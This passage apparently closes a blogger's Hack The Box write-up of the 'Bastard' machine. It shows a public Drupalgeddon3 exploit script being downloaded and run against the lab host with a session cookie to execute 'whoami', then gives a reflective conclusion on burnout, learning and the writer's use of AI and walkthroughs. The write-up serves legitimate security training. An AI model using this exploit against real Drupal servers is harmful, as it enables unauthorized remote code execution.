![BeyondRoot NodeOne]({{ '/assets/img/htb-bastard/Bastard_BeyondRoot_NodeOne.png' | relative_url }})

We can download a Python script [here](https://raw.githubusercontent.com/oways/SA-CORE-2018-004/master/drupalgeddon3.py) that creates the request for us. We'll save the script as `dg3.py` for shorthand and ease of use.

All we need to do now is provide the key arguments required for the script to work. It expects:

- **The Drupal CMS endpoint URL.**
- **The session name** and **session ID**, with an `=` between the two.
- **The node ID** we discovered earlier, which in this case is `1`.
- **The command** we want to execute on the system.
```Shell
┌──(kali㉿kali)-[~/…/Hack The Box/Machines/Bastard/Exploit]
└─$ python3 dg3.py http://10.129.61.127/ "SESS56c5897b0eb2402b5d017a288d71cb18=Ozs3EAztYTgX25TwAZTELcrB9bldJG26ZZq3PpGPo2U" 1 "whoami"
nt authority\iusr
```

At this point, we've now fully explored the box and taken an in-depth look at the machine.

---

## Conclusion

This machine has certainly lived up to its name and has given me a lot of lessons along the way. From falling down rabbit holes and being reminded that burnout is a real thing, to dealing with an extremely flaky connection that cost me over two hours just to find an API endpoint, this box has certainly tested my patience.

It has also taken me considerably longer than my usual one-box-per-four-days-off-slot. I eventually had to take some time away from it, play some games and just be a normal human for a while. That did come at the cost of not putting out my usual one-per-week machine write-up, but sometimes you have to accept that getting something finished isn't worth burning yourself out over.

I'm also currently studying for the CREST CPSA and have finally made moves towards booking the exam. As I'm currently on a 12-day holiday slot from work, I'm juggling studying, write-ups and trying to actually do the other things that family life demands.

I think this is a great box and it definitely fits the OSCP-like rating it has been given. It's a thoroughly enjoyable machine that can teach you a thing or two about patience, knowing when to step away, and most importantly, staying on the right workflow rather than disappearing down rabbit holes.

I'd also like to address something here. I've been using AI assistance to help create my write-ups and fact-check my writing. I've found using it as a learning aid, rather than simply throwing the box at it and saying **"do all the work"**, to be a very positive experience.

For those who are familiar with 0xdf, you may also notice some similarities in my write-ups. I'll be completely honest and say **yes, I do use his walkthroughs when I become stuck**. His guides are incredibly useful and have helped me a lot. The reason I'm mentioning all of this is for two reasons. Firstly, as a reader, I want to be as transparent with you as possible. I don't know everything, and I have a lot to learn. Secondly, for anyone new to the field, cybersecurity can be incredibly difficult and can sometimes feel like an uphill sprint with weights strapped to your back. There should be no shame in using walkthroughs, documentation, AI or other resources when you need help.

I've already mentioned that I used to be more of a **smash-and-grab** sort of player. That approach left me with numerous holes in my knowledge and made me feel unconfident when sitting in interviews or being asked technical questions.

The lesson I want to pass on is that, as learners, we should absolutely use resources to assist us when we need them, but we should always strive to understand what we're learning. Taking the quick win and leaving the understanding behind will eventually leave you high and dry.

That's one of the main reasons I now return to machines I've completed in the past. I want to prove to myself that I can not only complete them, but that I've taken the time to understand, learn and document the process properly. That's something I neglected to do when I was a beginner, frantically scrambling to get root and thinking that getting the flag was what actually proved something.

**Learning is about the journey and everything you pick up along the way. Getting a flag means very little unless you understand how you got there and can explain how and why it happened.**
